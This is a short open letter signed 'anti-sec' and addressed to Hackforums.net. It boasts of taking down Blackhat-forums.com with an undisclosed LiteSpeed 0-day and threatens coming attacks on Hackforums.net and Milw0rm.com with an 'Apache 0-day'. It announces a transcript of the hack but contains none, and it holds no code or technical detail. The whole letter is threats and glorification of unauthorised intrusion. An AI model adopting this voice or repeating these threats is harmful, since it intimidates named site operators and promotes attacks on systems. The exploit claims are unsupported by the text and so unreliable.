Dear Jesse Labrocca (Omniscient) and Hackforums.net,

The Anti-Sec movement has officially terminated Blackhat-forums.com using
yet ANOTHER 0-day exploit that we have discovered. This one takes advantage
of a previously undisclosed LiteSpeed vulnerability. This is primarily to
prove that we are serious and committed to our primary goal - eradicating
full-disclosure of computer vulnerabilities and exploits, and terminating
general discussion of hacking for any n00b and script-kiddie to read and
review - and learn from.

The Anti-Sec movement hopes Hackrforums.net now understands that our cyber
war against you is NOT a joke. We will be terminating Hackforums.net. You
are our number one target...we want to savor the moment and the suspense. We
will strike when you least expect it. This we promise.

Here is a brief transcript of the hacking of Blackhat-forums.com:

By terminating Blackhat-forums.com, we have furthered our goals in more ways
than one.

We are coming for you hackforums.net...and Milw0rm.com. We haven't forgotten
you, Milw0rm. Our juicy Apache 0-day will terminate both websites, which
will cause a major blow to those who support full-disclosure of hacking
related information.

"Take out two birds with one stone."

Sincerely,

-anti-sec
